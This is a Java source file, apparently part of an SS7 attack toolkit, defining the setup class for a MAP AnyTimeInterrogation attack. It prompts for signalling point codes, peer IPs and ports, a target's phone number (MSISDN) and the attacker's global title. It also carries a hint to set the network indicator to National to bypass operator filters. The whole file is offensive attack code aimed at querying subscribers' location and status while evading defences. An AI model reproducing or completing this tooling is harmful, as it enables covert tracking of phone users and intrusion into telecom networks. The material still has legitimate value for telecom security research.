/**
 * Created by gh0 on 9/8/16.
 */
/**
 *
 */

import org.apache.log4j.*;
import org.mobicents.protocols.ss7.m3ua.impl.parameter.ParameterFactoryImpl;
import org.mobicents.protocols.ss7.map.api.MAPDialogListener;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPServiceMobilityListener;


import java.util.Scanner;


public abstract class ATILowLevel implements MAPDialogListener, MAPServiceMobilityListener {


    // MTP Details
    protected int CLIENT_SPC;
    protected int SERVER_SPC;

    protected int NETWORK_INDICATOR;
    protected final int SERVICE_INDICATOR = 3; // SCCP
    protected final int SSN_Client = 147; //gsmSCF SSN
    protected final int SSN_Server = 6; //HLR SSN

    // M3UA details
    protected String CLIENT_IP;
    protected int CLIENT_PORT;


    protected String SERVER_IP;
    protected int SERVER_PORT;

    protected final String CLIENT_ASSOCIATION_NAME = "clientAsscoiation";

   //Target Details
    String MSISDN;

    //Attacker Details
    String gsmSCF;

    protected final ParameterFactoryImpl factory = new ParameterFactoryImpl();

    protected ATILowLevel() {
        init();
    }

    public void init() {
        try {
            Scanner user_input = new Scanner(System.in);


            System.out.print("\033[34m[*]\033[0mSet Client PC: ");
            CLIENT_SPC = user_input.nextInt();
            System.out.print("\033[34m[*]\033[0mSet Peer PC: ");
            SERVER_SPC = user_input.nextInt();


            System.out.print("\033[34m[*]\033[0mSet Client IP: ");
            CLIENT_IP = user_input.next();
            System.out.print("\033[34m[*]\033[0mSet Client Port: ");
            CLIENT_PORT = user_input.nextInt();
            System.out.print("\033[34m[*]\033[0mSet Peer IP: ");
            SERVER_IP = user_input.next();
            System.out.print("\033[34m[*]\033[0mSet Peer Port: ");
            SERVER_PORT = user_input.nextInt();

            System.out.println("***Bypass some filters, try setting it to National***");
            System.out.print("\033[34m[*]\033[0mSet Network Indicator [0] International [1] National: ");
            NETWORK_INDICATOR = user_input.nextInt();


            System.out.print("\033[34m[*]\033[0mSet Target's MSISDN: ");
            MSISDN = user_input.next();

            System.out.print("\033[34m[*]\033[0mSet your GT: ");
            gsmSCF = user_input.next();


            Thread.sleep(1000);

            System.out.println("\033[34m[*]\033[0mStack components are set...");
            System.out.println("\033[34m[*]\033[0mInitializing the Stack...");
            Thread.sleep(2000);


        } catch (Exception ex) {
            System.out.println("\033[31m[-]\033[0mError: " + ex);
        }


    }
}
